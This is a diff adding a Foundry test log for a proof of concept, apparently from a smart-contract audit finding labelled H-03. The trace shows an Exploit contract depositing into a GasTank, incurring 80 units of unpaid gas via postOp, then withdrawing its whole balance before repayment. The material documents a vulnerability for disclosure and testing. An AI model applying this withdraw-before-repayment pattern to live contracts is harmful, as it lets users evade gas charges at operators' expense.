@@ -1,0 +1,52 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/62850-h-03-users-escape-paying-tx-gas_exp.sol:PoC_62850
+[PASS] test_user_withdraws_before_async_gas_repayment() (gas: 802590)
+Traces:
+  [822490] PoC_62850::test_user_withdraws_before_async_gas_repayment()
+    ├─ [682397] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [270110] → new GasTank@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1349 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 1787 bytes of code
+    ├─ [97692] Exploit::run()
+    │   ├─ [23039] GasTank::deposit(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 100
+    │   │   └─ ← [Stop]
+    │   ├─ [23084] GasTank::postOp(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 80)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 80
+    │   │   └─ ← [Stop]
+    │   ├─ [1110] GasTank::withdraw(100)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 100 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [779] GasTank::balances(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [846] GasTank::unpaid(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 80
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 100
+    │   │   @ 2: 0 → 80
+    │   └─ ← [Stop]
+    ├─ [403] Exploit::escaped() [staticcall]
+    │   └─ ← [Return] 100
+    ├─ [0] VM::assertEq(100, 100) [staticcall]
+    │   └─ ← [Return]
+    ├─ [469] Exploit::outstanding() [staticcall]
+    │   └─ ← [Return] 80
+    ├─ [0] VM::assertEq(80, 80) [staticcall]
+    │   └─ ← [Return]
+    ├─ [681] Exploit::gasTank() [staticcall]
+    │   └─ ← [Return] GasTank: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [779] GasTank::balances(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.29ms (969.54µs CPU time)
+
+Ran 1 test suite in 28.86ms (1.29ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
